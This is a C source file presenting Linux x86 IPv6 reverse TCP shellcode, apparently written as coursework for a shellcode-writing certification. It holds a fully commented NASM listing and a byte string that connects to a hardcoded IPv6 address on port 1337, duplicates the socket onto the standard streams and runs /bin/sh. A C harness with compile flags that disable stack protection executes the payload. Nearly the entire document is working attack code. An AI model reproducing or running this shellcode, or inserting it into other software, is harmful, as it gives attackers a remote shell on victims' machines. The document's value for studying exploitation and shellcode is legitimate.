/*
# Exploit Title: Linux x86 IPv6 Reverse TCP Shellcode (94 bytes/null free)
# Date: 2018-08-26
# Shellcode Author: Kevin Kirsche
# Shellcode Repository: https://github.com/kkirsche/SLAE/tree/master/assignment_2-reverse_shell
# Tested on: Shell on Ubuntu 18.04 with gcc 7.3.0 / Connecting to Kali 2018.2

# This shellcode will connect to fd15:4ba5:5a2b:1002:61b7:23a9:ad3d:5509 on port 1337 and give you /bin/sh

This shellcode has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
Student ID: SLAE-1134

Compilation instructions:
	gcc -o shellcode shellcode.c -fno-stack-protector -z execstack

Commented NASM:
  global _start

  section .text

  _start:
    ; socket
    ;; cleanup
    xor ebx, ebx
    ;; arguments
    push ebx          ; #define IP_PROTO 0
    inc ebx
    push ebx          ; #define SOCK_STREAM 1
    push 0xa          ; #define PF_INET6 10
    ;; function
    mov ecx, esp      ; pointer to args on the stack into ecx
    push 0x66
    pop eax           ; socketcall 0x66 == 102
    ;; call
    int 0x80
    ;; returned data
    xchg esi, eax     ; sockfd eax -> esi

    ; connect ipv6
    ;; cleanup
    cdq
    ;; v6lhost struct
    push dword edx    ; v6lhost.sin6_scope_id
    ;; the address fd15:4ba5:5a2b:1002:61b7:23a9:ad3d:5509
    push dword 0x09553dad
    push dword 0xa923b761
    push dword 0x02102b5a
    push dword 0xa54b15fd
    push edx          ; v6lhost.sin6_flowinfo
    push word 0x3905  ; v6lhost.sin6_port = htons(1337)
    push word 0xa     ; v6lhost.sin6_family = 0xa (AF6_INET)
    ;; arguments
    mov ecx, esp      ; move our struct pointer into ECX
    push 0x1c         ; sizeof v6lhost
    push ecx          ; pointer v6lhost
    push esi          ; push sockfd onto the stack
    ;; function
    mov ecx, esp      ; pointer to args on the stack into ecx
    inc ebx
    inc ebx           ; #define SYS_CONNECT 3
    push 0x66         ; socketcall()
    pop eax
    ;; call
    int 0x80
    ;; returned data
    xchg ebx, esi     ; put sockfd into ebx for dup call

    ; dup2
    ;; setup counters
    sub ecx, ecx
    mov cl, 0x2
    ;; loop
  duploop:
    mov al, 0x3f      ; SYS_DUP2 syscall
    int 0x80          ; call SYS_DUP2
    dec ecx           ; decrement loop counter
    jns duploop       ; as long as SF is not set, keep looping

    ; execve
    ;; cleanup
    xor edx, edx
    ;; command to run
    push edx          ; NULL string terminator
    push 0x68732f2f   ; hs//
    push 0x6e69622f   ; nib/
    ;; arguments
    mov ecx, edx      ; null
    mov ebx, esp      ; pointer to args into ebx
    mov al, 0x0b      ; execve systemcall
    ;; call
    int 0x80
*/
#include <stdio.h>
#include <string.h>

unsigned char code[] = "\x31\xdb\x53\x43\x53\x6a\x0a\x89\xe1\x6a\x66\x58\xcd"
  "\x80\x96\x99\x52\x68\xad\x3d\x55\x09\x68\x61\xb7\x23\xa9\x68\x5a\x2b\x10"
  "\x02\x68\xfd\x15\x4b\xa5\x52\x66\x68\x05\x39\x66\x6a\x0a\x89\xe1\x6a\x1c"
  "\x51\x56\x89\xe1\x43\x43\x6a\x66\x58\xcd\x80\x87\xde\x29\xc9\xb1\x02\xb0"
  "\x3f\xcd\x80\x49\x79\xf9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
  "\x6e\x89\xd1\x89\xe3\xb0\x0b\xcd\x80";

int main() {
  // pollute the registers
  asm("mov $0x78975432, %eax\n\t"
      "mov $0x17645589, %ecx\n\t"
      "mov $0x23149875, %edx\n\t");

  // begin shellcode
	printf("Shellcode Length:  %d\n", strlen(code));
  // execute our shellcode
	int (*ret)() = (int(*)())code;
	ret();
}
